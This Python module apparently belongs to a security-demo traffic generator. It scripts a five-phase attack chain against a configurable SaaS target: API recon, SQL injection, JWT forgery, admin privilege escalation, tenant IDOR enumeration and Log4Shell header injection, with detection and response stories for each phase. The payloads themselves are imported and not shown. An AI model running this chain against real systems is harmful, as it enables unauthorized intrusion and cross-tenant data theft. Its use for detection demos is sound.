"""
SaaS/Tech scenario — Operation Tenant Escape
5-phase attack chain targeting CloudMatrix SaaS platform.
"""

import random

from attacks.engine import send_request, log_phase_event, sleep_between_requests
from attacks.payloads.saas import (
    RECON_PATHS, GRAPHQL_INTROSPECTION, SCANNER_AGENTS, TENANT_IDS,
    API_SQLI, ADMIN_PAYLOADS, JWT_FORGERY_HEADERS, LOG4SHELL_SAAS,
)

INDUSTRY_NAME = "SaaS / Tech"
CAMPAIGN_NAME = "Operation Tenant Escape"
INDUSTRY_COLOR = "#6c3483"
INDUSTRY_ICON = "☁️"


def fire_phase_1_one(target, log_buffer, log_counter, stop_flag):
    if random.random() < 0.4:
        # GraphQL introspection
        query = random.choice(GRAPHQL_INTROSPECTION)
        send_request(
            url=f"{target}/graphql",
            method="POST",
            data=query,
            headers={
                "Content-Type": "application/json",
                "User-Agent": random.choice(SCANNER_AGENTS),
            },
            label="GraphQL Introspection → schema enumeration",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=1, industry="saas",
        )
    else:
        path = random.choice(RECON_PATHS)
        agent = random.choice(SCANNER_AGENTS)
        send_request(
            url=f"{target}{path}",
            headers={"User-Agent": agent},
            label=f"API Recon → {path}",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=1, industry="saas",
        )


def fire_phase_1_many(count, delay_range, target, log_buffer, log_counter, stop_flag):
    log_phase_event("Phase 1: API Surface Reconnaissance — GraphQL introspection, OpenAPI probing, .env discovery", 1, "saas", log_buffer, log_counter)
    for _ in range(count):
        if stop_flag and stop_flag.is_set():
            break
        fire_phase_1_one(target, log_buffer, log_counter, stop_flag)
        sleep_between_requests(custom_range=delay_range)


def fire_phase_2_one(target, log_buffer, log_counter, stop_flag):
    endpoint = random.choice(["/api/keys", "/api/v1/config", "/api/v1/users/me"])
    if endpoint == "/api/v1/users/me" and random.random() < 0.5:
        payload = random.choice(API_SQLI)
        send_request(
            url=f"{target}{endpoint}",
            params={"include": payload},
            label=f"API Key Theft → SQLi {payload[:50]}",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=2, industry="saas",
        )
    else:
        extra_headers = random.choice(JWT_FORGERY_HEADERS) if random.random() < 0.4 else {}
        send_request(
            url=f"{target}{endpoint}",
            headers=extra_headers,
            label=f"API Key Extraction → {endpoint}",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=2, industry="saas",
        )


def fire_phase_2_many(count, delay_range, target, log_buffer, log_counter, stop_flag):
    log_phase_event("Phase 2: API Key Extraction — probing /api/keys, /api/v1/config, header injection for internal tokens", 2, "saas", log_buffer, log_counter)
    for _ in range(count):
        if stop_flag and stop_flag.is_set():
            break
        fire_phase_2_one(target, log_buffer, log_counter, stop_flag)
        sleep_between_requests(custom_range=delay_range)


def fire_phase_3_one(target, log_buffer, log_counter, stop_flag):
    endpoint = random.choice(["/api/v1/admin", "/admin/impersonate", "/oauth/token"])
    if endpoint == "/oauth/token":
        payload = random.choice(ADMIN_PAYLOADS)
        send_request(
            url=f"{target}{endpoint}",
            method="POST",
            data=payload,
            label="OAuth Abuse → client_credentials grant escalation",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=3, industry="saas",
        )
    else:
        jwt_header = random.choice(JWT_FORGERY_HEADERS)
        send_request(
            url=f"{target}{endpoint}",
            method="POST",
            data={"role": "admin", "bypass": "true"},
            headers=jwt_header,
            label=f"Privilege Escalation → {endpoint}",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=3, industry="saas",
        )


def fire_phase_3_many(count, delay_range, target, log_buffer, log_counter, stop_flag):
    log_phase_event("Phase 3: Privilege Escalation — admin endpoint probing, JWT forgery, OAuth abuse", 3, "saas", log_buffer, log_counter)
    for _ in range(count):
        if stop_flag and stop_flag.is_set():
            break
        fire_phase_3_one(target, log_buffer, log_counter, stop_flag)
        sleep_between_requests(custom_range=delay_range)


def fire_phase_4_one(target, log_buffer, log_counter, stop_flag):
    tenant_id = random.choice(TENANT_IDS)
    if random.random() < 0.4:
        payload = random.choice(API_SQLI)
        send_request(
            url=f"{target}/api/v1/billing",
            params={"tenant": payload},
            label=f"Tenant SQLi → billing?tenant={payload[:50]}",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=4, industry="saas",
        )
    elif random.random() < 0.5:
        send_request(
            url=f"{target}/api/v1/tenants/{tenant_id}",
            label=f"IDOR → /api/v1/tenants/{tenant_id}",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=4, industry="saas",
        )
    else:
        send_request(
            url=f"{target}/api/v1/users",
            params={"tenant_id": tenant_id},
            label=f"Tenant Isolation Bypass → tenant_id={tenant_id}",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=4, industry="saas",
        )


def fire_phase_4_many(count, delay_range, target, log_buffer, log_counter, stop_flag):
    log_phase_event("Phase 4: Tenant Isolation Breach — sequential tenant ID enumeration, IDOR, SQLi on billing", 4, "saas", log_buffer, log_counter)
    for i in range(count):
        if stop_flag and stop_flag.is_set():
            break
        tenant_id = 2001 + (i % 50)
        send_request(
            url=f"{target}/api/v1/tenants/{tenant_id}",
            label=f"IDOR → /api/v1/tenants/{tenant_id}",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=4, industry="saas",
        )
        sleep_between_requests(custom_range=delay_range)


def fire_phase_5_one(target, log_buffer, log_counter, stop_flag):
    cve = random.choice(LOG4SHELL_SAAS)
    send_request(
        url=f"{target}/api/v1/users",
        headers={
            "User-Agent": cve["ua"],
            "X-Request-ID": cve["x_request_id"],
            "X-Forwarded-Host": cve["x_forwarded_host"],
        },
        label="Log4Shell CVE-2021-44228 → Java backend /api/v1/users",
        log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
        phase=5, industry="saas",
    )


def fire_phase_5_many(count, delay_range, target, log_buffer, log_counter, stop_flag):
    log_phase_event("Phase 5: Backend Infrastructure Zero-Day — Log4Shell CVE-2021-44228 on Java backend services", 5, "saas", log_buffer, log_counter)
    endpoints = ["/api/v1/users", "/api/v1/tenants", "/api/v1/admin"]
    for _ in range(count):
        if stop_flag and stop_flag.is_set():
            break
        cve = random.choice(LOG4SHELL_SAAS)
        endpoint = random.choice(endpoints)
        send_request(
            url=f"{target}{endpoint}",
            headers={
                "User-Agent": cve["ua"],
                "X-Request-ID": cve["x_request_id"],
                "X-Forwarded-Host": cve["x_forwarded_host"],
            },
            label=f"Log4Shell CVE-2021-44228 → {endpoint}",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=5, industry="saas",
        )
        sleep_between_requests(custom_range=delay_range)


PHASES = [
    {
        "number": 1,
        "name": "API Surface Reconnaissance",
        "description": "Attacker enumerating all API endpoints, GraphQL schema, and OAuth configuration",
        "what_fires": "GraphQL introspection query {__schema}, OpenAPI/Swagger probing, .env discovery, /api/docs enumeration",
        "cloudflare_story": "GraphQL introspection detected + sensitive file probing (.env, swagger.json). Bot score: 5/100.",
        "sentinelone_story": "Systematic API enumeration. Attacker building complete picture of platform surface. Targeted, not opportunistic.",
        "hyperautomation": "GraphQL introspection + env file probing → Block IP, disable GraphQL introspection, alert platform security",
        "fire_one": fire_phase_1_one,
        "fire_many": fire_phase_1_many,
    },
    {
        "number": 2,
        "name": "API Key Extraction",
        "description": "Attacker attempting to extract API keys through misconfiguration and injection attacks",
        "what_fires": "GET /api/keys, GET /api/v1/config, SQLi on /api/v1/users/me?include=, X-Internal-Token header probing",
        "cloudflare_story": "API key endpoint probing + config endpoint access attempts. Multiple 403s. JWT manipulation detected.",
        "sentinelone_story": "Attacker specifically targeting API key management endpoints. Matches known SaaS attack playbook in threat intel.",
        "hyperautomation": "API key endpoint probing → Rotate all API keys for affected tenant, notify account owners, flag for review",
        "fire_one": fire_phase_2_one,
        "fire_many": fire_phase_2_many,
    },
    {
        "number": 3,
        "name": "Privilege Escalation Attempt",
        "description": "Attacker attempting to escalate to admin role and access tenant management endpoints",
        "what_fires": "POST /api/v1/admin with role manipulation, /admin/impersonate probing, JWT token forgery (alg:none), OAuth abuse",
        "cloudflare_story": "Multiple 403s on admin endpoints. OAuth client_credentials grant abuse pattern detected.",
        "sentinelone_story": "Escalation attempt following successful API enumeration. Same threat actor — Phase 3 of coordinated attack confirmed by AI.",
        "hyperautomation": "Admin endpoint probing + OAuth abuse → Lock admin API, revoke suspicious OAuth tokens, alert IAM team",
        "fire_one": fire_phase_3_one,
        "fire_many": fire_phase_3_many,
    },
    {
        "number": 4,
        "name": "Tenant Isolation Breach Attempt",
        "description": "Attacker attempting to access data from other tenants by manipulating tenant IDs",
        "what_fires": "Sequential GET /api/v1/tenants/2001→2050, IDOR via tenant_id param, SQLi on /api/v1/billing?tenant=",
        "cloudflare_story": "Sequential tenant ID access + SQLi on billing endpoint. WAFSQLiAttackScore: 96. IDOR pattern flagged.",
        "sentinelone_story": "Tenant isolation attack. If successful — full access to all customer data. Escalated to highest severity by AI.",
        "hyperautomation": "IDOR pattern + SQLi on tenant data → Critical incident, isolate affected tenant APIs, notify all impacted customers",
        "fire_one": fire_phase_4_one,
        "fire_many": fire_phase_4_many,
    },
    {
        "number": 5,
        "name": "Backend Infrastructure Zero-Day",
        "description": "Log4Shell exploit targeting Java-based backend services for complete infrastructure compromise",
        "what_fires": "CVE-2021-44228 in User-Agent, X-Request-ID, X-Forwarded-Host headers on Java backend endpoints",
        "cloudflare_story": "Log4Shell CVE-2021-44228 blocked. FirewallForAIInjectionScore: 100. WAFRCEAttackScore: 99.",
        "sentinelone_story": "Full 5-phase campaign concluded. Nation-state tooling on SaaS backend. Complete attack chain correlated into single Critical incident by AI.",
        "hyperautomation": "Log4Shell + Critical → Isolate Java services, push emergency WAF rule to Cloudflare, page CTO + CISO, open customer breach notification workflow",
        "fire_one": fire_phase_5_one,
        "fire_many": fire_phase_5_many,
    },
]
